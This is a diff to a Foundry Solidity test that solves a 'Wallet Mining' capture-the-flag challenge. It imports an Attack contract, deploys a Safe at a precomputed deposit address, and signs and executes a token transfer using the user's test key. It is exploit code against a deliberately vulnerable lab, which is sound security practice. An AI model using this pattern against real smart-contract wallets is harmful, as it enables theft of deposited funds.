@@ -25,6 +25,9 @@ import {
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
 
+import {ERC20} from "solmate/tokens/ERC20.sol";
+import {Attack} from "./Attack.t.sol";
+
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
     address upgrader = makeAddr("upgrader");
@@ -157,7 +160,59 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+
+        bytes memory initializer = abi.encodeCall(Safe.setup, (
+            owners,
+            uint256(1),
+            address(0),
+            bytes(""),
+            address(0),
+            address(0),
+            uint256(0),
+            payable(address(0))
+        ));
+
+        Attack attack = new Attack(token, authorizer, walletDeployer, proxyFactory, singletonCopy);
+        attack.deploy(USER_DEPOSIT_ADDRESS, initializer, ward);
+
+        Safe userSafe = Safe(payable(USER_DEPOSIT_ADDRESS));
+        bytes32 txHash = userSafe.getTransactionHash(
+            address(token),
+            uint256(0),
+            abi.encodeCall(ERC20.transfer, (user, DEPOSIT_TOKEN_AMOUNT)),
+            Enum.Operation.Call,
+            uint256(1_000_000),
+            uint256(1_000_000),
+            uint256(1_000_000),
+            address(0),
+            user,
+            uint256(0)
+        );
+
+        vm.stopPrank();
+
+        vm.prank(vm.addr(userPrivateKey));
+        userSafe.approveHash(txHash);
+
+        vm.startPrank(player, player);
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        userSafe.execTransaction(
+            address(token),
+            uint256(0),
+            abi.encodeCall(ERC20.transfer, (user, DEPOSIT_TOKEN_AMOUNT)),
+            Enum.Operation.Call,
+            uint256(1_000_000),
+            uint256(1_000_000),
+            uint256(1_000_000),
+            address(0),
+            payable(user),
+            signature
+        );
     }
 
     /**
